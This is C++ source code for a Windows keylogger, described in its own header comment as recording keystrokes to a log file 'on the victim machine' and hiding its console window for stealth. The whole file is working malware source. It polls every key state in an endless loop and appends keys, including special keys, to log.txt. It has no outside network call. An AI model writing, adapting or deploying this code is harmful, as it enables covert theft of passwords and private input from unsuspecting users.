/*
 * Author      : Nemuel Wainaina
 * Description : The program simply logs keystrokes and writes them
                 to a file on the victim machine . It also achieves
                 stealth by not popping up a window as it runs
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>

#define LOGFILE "log.txt"

using namespace std; 

void stealth();
int logKey(int key);

int main() {
    stealth();

    while(1) {
        for(char i=8; i<=190; i++) {
            if(GetAsyncKeyState(i) == -32767) {
                logKey(i);
            }
        }
    }

    system("PAUSE");
    return 0;
}

// hide the window when the program is running
void stealth() {
    HWND stlth;
    AllocConsole();
    stlth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stlth, 0);
}

// append the keystroke to the logfile
int logKey(int key) {
    FILE* f = fopen(LOGFILE, "a");

    if(key == 8) {
        fprintf(f, "%s", "[BACKSPACE]");
    } else if (key == 13) {
        fprintf(f, "%s", "\n");
    } else if (key == 32) {
        fprintf(f, "%s", " ");
    } else if (key == VK_SHIFT) {
        fprintf(f, "%s", "[SHIFT]");
    } else if (key == VK_CONTROL) {
        fprintf(f, "%s", "[CONTROL]");
    } else if (key == VK_TAB) {
        fprintf(f, "%s", "[TAB]");
    } else if (key == VK_ESCAPE) {
        fprintf(f, "%s", "[ESCAPE]");
    } else if (key == VK_HOME) {
        fprintf(f, "%s", "[HOME]");
    } else if (key == VK_END) {
        fprintf(f, "%s", "[END]");
    } else if (key == VK_RIGHT) {
        fprintf(f, "%s", "[RIGHT]");
    } else if (key == VK_LEFT) {
        fprintf(f, "%s", "[LEFT]");
    } else if (key == VK_UP) {
        fprintf(f, "%s", "[UP]");
    } else if (key == VK_DOWN) {
        fprintf(f, "%s", "[DOWN]");
    } else if ((key == 110) || (key == 190)) {
        fprintf(f, "%s", ".");
    } else {
        fprintf(f, "%s", &key);
    }
}